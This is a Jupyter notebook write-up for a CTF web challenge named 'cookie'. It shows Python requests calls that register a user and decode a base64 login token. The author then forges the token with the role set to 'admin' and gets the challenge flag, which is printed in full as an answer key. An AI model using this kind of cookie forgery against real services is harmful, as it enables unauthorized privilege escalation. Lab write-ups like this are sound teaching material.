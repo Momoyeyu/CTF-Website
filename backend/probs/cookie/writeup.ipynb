{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WriteUp\n",
    "\n",
    "by koito"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'error': 'ok', 'data': {'status': 'everything is ok'}}"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from requests import *\n",
    "api_base = \"http://localhost:8000/\"\n",
    "\n",
    "get(api_base+\"status\").json()"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "首先不知道用户名和密码，但是有个`register`接口，那就注册一个，然后再尝试登录"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "([], {'error': 'ok', 'data': {'status': 'ok'}})"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "resp = post(api_base+\"register\",json={\"username\":\"1\",\"password\":\"\"})\n",
    "resp.cookies.items(), resp.json()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "([('token',\n",
       "   'eyJ1c2VybmFtZSI6ICIxIiwgInBhc3N3b3JkIjogIiIsICJyb2xlIjogInVzZXIifQ==')],\n",
       " {'error': 'ok', 'data': {'status': 'ok'}})"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "resp = post(api_base+\"login\",json={\"username\":\"1\",\"password\":\"\"})\n",
    "resp.cookies.items(), resp.json()"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "这个token一眼base64,解个码试试看\n",
    "```\n",
    "{\"username\": \"1\", \"password\": \"\", \"role\": \"user\"}\n",
    "```\n",
    "把role改成admin,再试一次"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'error': 'ok',\n",
       " 'data': {'flag': 'moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}'}}"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from base64 import *\n",
    "get(api_base+\"flag\",cookies={\n",
    "    \"token\":b64encode(b'{\"username\":\"1\",\"password\":\"\",\"role\":\"admin\"}').decode()\n",
    "}).json()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
